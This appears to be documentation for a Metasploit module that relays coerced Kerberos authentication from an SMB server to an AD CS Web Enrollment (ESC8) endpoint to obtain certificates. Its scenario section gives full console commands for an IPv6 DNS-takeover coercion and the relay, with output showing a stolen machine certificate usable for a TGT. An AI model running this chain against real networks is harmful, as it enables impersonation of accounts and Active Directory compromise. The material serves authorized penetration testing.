## Vulnerable Application

This module creates an SMB server and relays the **Kerberos** authentication it
captures to an AD CS HTTP(S) Web Enrollment (ESC8) endpoint, then requests a
certificate on behalf of the coerced principal. It is the Kerberos counterpart
to `auxiliary/server/relay/esc8` (which relays NTLM): instead of an NTLM
NTLMSSP exchange, it extracts the Kerberos AP-REQ from the SPNEGO blob a victim
sends to the SMB server and replays it to the CA over HTTP `Authorization:
Negotiate`.

Because a Kerberos service ticket is bound to a specific service principal name
(SPN), the victim must be coerced into authenticating to a name whose SPN the
attacker can relay. This is done with a DNS-takeover coercion module (see the
Scenarios section), which is the technique described in CVE-2026-20929: an
IPv6 DNS takeover (rogue DHCPv6 or Router Advertisement) hands the attacker as
the victim's DNS server, and a CNAME record steers the victim's connection to
the attacker's SMB server while the ticket is still issued for the target SPN.

Unlike NTLM relay, the AP-REQ is encrypted, so the authenticating identity is
not visible on the wire. The operator supplies the coerced principal via
`RELAY_IDENTITY` so the module can pick the correct certificate template and
label its output.

## Verification Steps

This module is the relay half of a two-part technique and is normally paired
with a coercion module. For the full end-to-end setup see the Scenarios section.

1. Configure an ESC8-vulnerable host (AD CS with HTTP Web Enrollment enabled)
    * See https://docs.metasploit.com/docs/pentesting/active-directory/ad-certificates/overview.html#setting-up-a-esc8-vulnerable-host
2. Start `msfconsole`
3. Do: `use auxiliary/server/relay/esc8_kerberos`
4. Set `RHOSTS` to the AD CS Web Enrollment server
5. Set `RELAY_IDENTITY` to the principal you will coerce (for example `WIN-VICTIM$@ad.example.com`)
6. Run the module and, in parallel, coerce the victim (see Scenarios)
7. Wait for the Kerberos AP-REQ to be relayed and a certificate to be issued

## Options

### MODE

The issue mode. Controls what the module does once the relayed connection to
the Web Enrollment server is authenticated. Must be one of:

* ALL: Enumerate all available certificate templates and issue each of them.
* AUTO: Automatically select the `User` or `Machine`/`DomainController` template
  based on whether the coerced `RELAY_IDENTITY` is a user or a machine account
  (machine accounts end in `$`).
* QUERY_ONLY: Enumerate available certificate templates but do not issue any.
* SPECIFIC_TEMPLATE: Issue only the template named in `CERT_TEMPLATE`.

### CERT_TEMPLATE

The template to issue when `MODE` is `SPECIFIC_TEMPLATE` (for example `Machine`
or `User`).

### RELAY_IDENTITY

The Kerberos principal you are coercing (for example `WIN-VICTIM$@ad.example.com`
or `labuser@ad.example.com`). Because the relayed AP-REQ is encrypted, this
identity is not recoverable from the wire; the module uses it to choose the
certificate template (in `AUTO` mode) and to label its output. It does not need
to match a password or key.

`RHOSTS` is the AD CS Web Enrollment host to relay to, and the module listens for
the coerced Kerberos authentication on the SMB port (`SRVPORT`, default 445).

## Scenarios

The technique has two halves running at the same time: this relay server, and a
coercion module that (a) makes the victim use the attacker as its DNS server and
(b) steers the victim's connection to the attacker while the Kerberos ticket is
still minted for the real target SPN.

### Full coerce-to-certificate flow (native IPv6 DNS takeover)

Terminal 1 - start the relay server:

```
msf > use auxiliary/server/relay/esc8_kerberos
msf auxiliary(server/relay/esc8_kerberos) > set RHOSTS ca.ad.example.com
msf auxiliary(server/relay/esc8_kerberos) > set RELAY_IDENTITY WIN-VICTIM$@ad.example.com
msf auxiliary(server/relay/esc8_kerberos) > set MODE SPECIFIC_TEMPLATE
msf auxiliary(server/relay/esc8_kerberos) > set CERT_TEMPLATE Machine
msf auxiliary(server/relay/esc8_kerberos) > run
[*] Auxiliary module running as background job 0.
[*] SMB Server is running. Listening on 0.0.0.0:445
```

Terminal 2 - coerce the victim with the native IPv6 DNS takeover (either the
DHCPv6 or the Router Advertisement module):

```
msf > use auxiliary/spoof/ipv6/ipv6_ra_dns_takeover
msf auxiliary(spoof/ipv6/ipv6_ra_dns_takeover) > set TARGET_DOMAIN ad.example.com
msf auxiliary(spoof/ipv6/ipv6_ra_dns_takeover) > set SPOOF_IP6 dead:beef::5
msf auxiliary(spoof/ipv6/ipv6_ra_dns_takeover) > set RELAY_CNAME attacker.ad.example.com
msf auxiliary(spoof/ipv6/ipv6_ra_dns_takeover) > run
```

Once the victim resolves the target service through the attacker and
authenticates to the attacker's SMB server, the relay server extracts the
AP-REQ, replays it to the CA, and saves the issued certificate:

```
[*] New Kerberos request from 192.168.64.2
[*] Received AP-REQ for coerced principal WIN-VICTIM$@ad.example.com
[*] Relaying to next target http://ca.ad.example.com/certsrv/
[+] Successfully authenticated against relay target http://ca.ad.example.com/certsrv/
[*] Creating certificate request for WIN-VICTIM$ using the Machine template
[*] Requesting relay target generate certificate...
[+] Certificate for WIN-VICTIM$ using template Machine saved to ~/.msf4/loot/..._windows.ad.cs_....pfx
```

The resulting `.pfx` can then be used with `auxiliary/admin/kerberos/get_ticket`
(PKINIT) to obtain a TGT for the coerced account.

## Notes

* This module supports Kerberos only; for NTLM relay to ESC8 use
  `auxiliary/server/relay/esc8`.
* The relay is one-shot per coerced authentication: a Kerberos AP-REQ is bound to
  the SPN it was issued for, so there is no NTLM-style multi-target challenge loop.
* A full end-to-end run against a live domain requires the CA and the KDC to be
  reachable during coercion. When the CA and KDC are the same host, use the
  CNAME/passthrough options of the coercion module so the KDC leg stays reachable
  while the service connection is hijacked.
